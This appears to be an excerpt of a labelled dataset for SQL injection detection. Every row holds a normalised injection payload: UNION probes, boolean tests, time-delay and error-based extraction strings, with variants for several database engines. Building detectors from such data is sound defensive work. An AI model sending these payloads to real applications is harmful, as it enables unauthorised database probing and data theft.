row_index,payload_norm,label,sqli_type_hint
10320,"1' where 9605 = 9605 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",1,
10321,-2223' ) ) as mjwp where 8650 = 8650 or 7900 = 5838,1,
10322,"1' ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'ibrj' = 'ibrj",1,
10323,select ( case when ( 6843 = 2657 ) then 6843 else 6843* ( select 6843 from information_schema.character_sets ) end ) #,1,
10324,"1' ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'pufu' like 'pufu",1,
10325,"1"" ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""ytju"" like ""ytju",1,
10326,1 ) ) as qlkf where 6635 = 6635,1,
10327,waitfor delay '0:0:5' ) ||',1,
10328,"-9569%' ) ) union all select 8405,8405,8405,8405--",1,
10329,"-5755"" or 3581 = 7566",1,
10330,"1"" ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""fktl"" = ""fktl",1,
10331,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",1,
10332,"1 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) -- viti",1,
10333,1' and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and 'ukzb' = 'ukzb,1,
10334,"1' ) where 2802 = 2802 union all select null,null,null#",1,
10335,1 ) ) as myxo where 1759 = 1759 union all select null#,1,
10336,"1"" ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""ksxz"" = ""ksxz",1,
10337,select ( case when ( 3168 = 5577 ) then 3168 else 3168* ( select 3168 from mysql.db ) end ) #,1,
10338,1 ) waitfor delay '0:0:5',1,
10339,"1' ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'onmp' = 'onmp",1,
10340,"-7248"" ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ""qgms"" = ""qgms",1,
10341,1' ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),1,
10342,"-7234"" ) union all select 3154,3154,3154,3154#",1,
10343,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) --",1,
10344,"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",1,
10345,-8521'+ ( select ucim where 9003 = 9003 union all select 9003--,1,
10346,"1"" ) ) order by 1--",1,
10347,"1"" ) where 9656 = 9656 and sleep ( 5 ) --",1,
10348,"-2500' ) ) ) union all select 6853,6853,6853,6853--",1,
10349,"1'+ ( select 'wkbg' where 3921 = 3921 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) +'",1,
